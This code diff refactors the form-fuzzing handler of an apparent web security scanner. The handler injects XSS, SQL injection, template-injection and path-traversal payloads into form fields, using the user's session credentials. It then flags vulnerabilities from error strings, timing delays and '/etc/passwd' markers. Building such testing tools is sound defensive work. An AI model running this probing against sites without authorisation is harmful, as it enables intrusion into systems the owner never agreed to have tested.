-    const sqliErrors = ['sql syntax', 'mysql', 'sqlite', 'postgresql', 'ora-', 'syntax error', 'unclosed quotation', 'unterminated string', 'SQLSTATE', 'microsoft sql', 'odbc', 'jdbc', 'quoted string not properly terminated'];
+    const { action, method, fields, category, selectedFields } = msg;
+    // Use the shared payload library — same source of truth as URL-fuzz. Previously this handler
+    // accepted `payloads` from the caller and the caller hardcoded only 4 categories' worth client-side,
+    // silently falling back to XSS payloads for any other category. That meant clicking
+    // "Proto Pollution" in form mode actually fired <script>alert(1)</script> payloads.
+    const payloads = [...(FUZZ_PAYLOADS[category] || FUZZ_PAYLOADS.xss)];
+    if (msg.customPayloads && msg.customPayloads.length) {
+      msg.customPayloads.forEach(cp => payloads.push({ p: cp, check: 'reflected' }));
+    }
     const results = [];
 
     // Baseline: submit form with original values
@@ -1547,74 +1499,53 @@ const handlers = {
       baselineLen = baselineBody.length;
     } catch {}
 
-    // Test each field with each payload
-    for (const field of fields) {
-      if (!field.name) continue;
+    // Test only the selected fields (filter on the server side too — UI already does this, but defensive)
+    const fieldsToTest = (selectedFields && selectedFields.length)
+      ? fields.filter(f => f.name && selectedFields.includes(f.name))
+      : fields.filter(f => f.name);
+
+    for (const field of fieldsToTest) {
       for (const { p: payload, check, expect } of payloads) {
         const formData = new URLSearchParams();
         fields.forEach(f => {
+          if (!f.name) return;
           formData.append(f.name, f.name === field.name ? payload : (f.value || 'test'));
         });
-
+        const isTimeBased = check === 'sqli_blind_time';
         try {
           const t0 = Date.now();
           const opts = method.toUpperCase() === 'POST'
-            ? { method: 'POST', body: formData.toString(), headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, credentials: 'include', redirect: 'follow', signal: AbortSignal.timeout(15000) }
-            : { method: 'GET', credentials: 'include', redirect: 'follow', signal: AbortSignal.timeout(15000) };
+            ? { method: 'POST', body: formData.toString(), headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, credentials: 'include', redirect: 'follow', signal: AbortSignal.timeout(isTimeBased ? 15000 : 8000) }
+            : { method: 'GET', credentials: 'include', redirect: 'follow', signal: AbortSignal.timeout(isTimeBased ? 15000 : 8000) };
           const testUrl = method.toUpperCase() === 'GET' ? action + '?' + formData.toString() : action;
           const r = await fetch(testUrl, opts);
           const elapsed = Date.now() - t0;
           const body = await r.text();
           const rawReflected = body.includes(payload);
-
-          let severity = 'safe', analysis = '', context = '';
-
+          let context = '';
           if (rawReflected) {
             const idx = body.indexOf(payload);
             context = body.slice(Math.max(0, idx - 80), Math.min(body.length, idx + payload.length + 80));
           }
-
-          if (check === 'unencoded_html') {
-            const htmlEncoded = body.includes(payload.replace(/</g, '&lt;').replace(/>/g, '&gt;'));
-            if (rawReflected && !htmlEncoded) { severity = 'high'; analysis = 'Payload reflected UNENCODED — likely XSS!'; }
-            else if (htmlEncoded) { severity = 'safe'; analysis = 'HTML-encoded (safe)'; }
-            else { severity = 'safe'; analysis = 'Not reflected'; }
-          } else if (check === 'unencoded_attr') {
-            if (rawReflected && context.includes('"')) { severity = 'high'; analysis = 'Quote reflected unencoded — attribute breakout'; }
-            else { severity = rawReflected ? 'low' : 'safe'; analysis = rawReflected ? 'Reflected but quotes encoded' : 'Not reflected'; }
-          } else if (check === 'sqli_error') {
-            const bodyLower = body.toLowerCase();
-            const errorFound = sqliErrors.find(e => bodyLower.includes(e));
-            const errorInBaseline = errorFound && baselineBody.toLowerCase().includes(errorFound);
-            if (errorFound && !errorInBaseline) { severity = 'high'; analysis = 'SQL error: "' + errorFound + '"';
-              const errIdx = bodyLower.indexOf(errorFound);
-              context = body.slice(Math.max(0, errIdx - 40), Math.min(body.length, errIdx + errorFound.length + 80));
-            } else if (r.status === 500 && baselineBody !== body) { severity = 'medium'; analysis = 'Server error (500) on payload'; }
-            else { severity = 'safe'; analysis = 'No SQL errors'; }
-          } else if (check === 'sqli_blind_time') {
-            const timeDiff = elapsed - baselineTime;
-            if (timeDiff > 3000) { severity = 'high'; analysis = `Response delayed ${(elapsed/1000).toFixed(1)}s (baseline ${(baselineTime/1000).toFixed(1)}s) — blind SQLi confirmed!`; }
-            else if (timeDiff > 1500) { severity = 'medium'; analysis = `Slight delay ${(elapsed/1000).toFixed(1)}s (baseline ${(baselineTime/1000).toFixed(1)}s) — investigate`; }
-            else { severity = 'safe'; analysis = `No delay (${(elapsed/1000).toFixed(1)}s)`; }
-          } else if (check === 'ssti_eval') {
-            const evalRegex = new RegExp('(?<![0-9a-fA-F])' + expect + '(?![0-9a-fA-F])');
-            const evalMatch = evalRegex.exec(body);
-            if (evalMatch && !rawReflected && !baselineBody.includes(expect)) { severity = 'high'; analysis = 'Template expression EVALUATED — ' + payload + ' = ' + expect; context = body.slice(Math.max(0, evalMatch.index - 40), Math.min(body.length, evalMatch.index + expect.length + 40)); }
-            else { severity = 'safe'; analysis = rawReflected ? 'Literal echoed (not evaluated)' : 'Not reflected'; }
-          } else if (check === 'file_content') {
-            const indicators = ['root:', '/bin/bash', '/bin/sh', 'daemon:', 'nobody:'];
-            const found = indicators.find(f => body.includes(f));
-            if (found) { severity = 'high'; analysis = 'File content: "' + found + '" — path traversal!'; }
-            else { severity = 'safe'; analysis = 'No file content'; }
-          } else {
-            severity = rawReflected ? 'low' : 'safe';
-            analysis = rawReflected ? 'Reflected (review manually)' : 'Not reflected';
-          }
-
+          const ev = evaluateFuzzResult({
+            check, payload, expect, body, baselineBody, baselineLen,
+            elapsed, baselineTime, status: r.status, headers: r.headers,
+            rawReflected, context,
+          });
           let errorBody = '';
           if (r.status >= 500 && body.length < 5000) errorBody = body.slice(0, 500);
-
-          results.push({ field: field.name, fieldType: field.type, payload, severity, analysis, status: r.status, bodyLen: body.length, elapsed, context: severity !== 'safe' ? context : '', errorBody, responsePreview: body.slice(0, 600), requestBody: formData.toString(), requestUrl: testUrl });
+          results.push({
+            field: field.name, fieldType: field.type, payload,
+            severity: ev.severity, analysis: ev.analysis,
+            status: r.status, bodyLen: body.length, elapsed,
+            context: ev.severity !== 'safe' ? ev.context : '',
+            errorBody,
+            responsePreview: body.slice(0, 600),
+            responseFull: body.length > 1_000_000 ? body.slice(0, 1_000_000) : body,
+            responseTruncated: body.length > 1_000_000,
+            responseTotalLen: body.length,
+            requestBody: formData.toString(), requestUrl: testUrl,
+          });
         } catch (e) {
           results.push({ field: field.name, fieldType: field.type, payload, severity: 'info', analysis: 'Request failed: ' + e.message });
         }
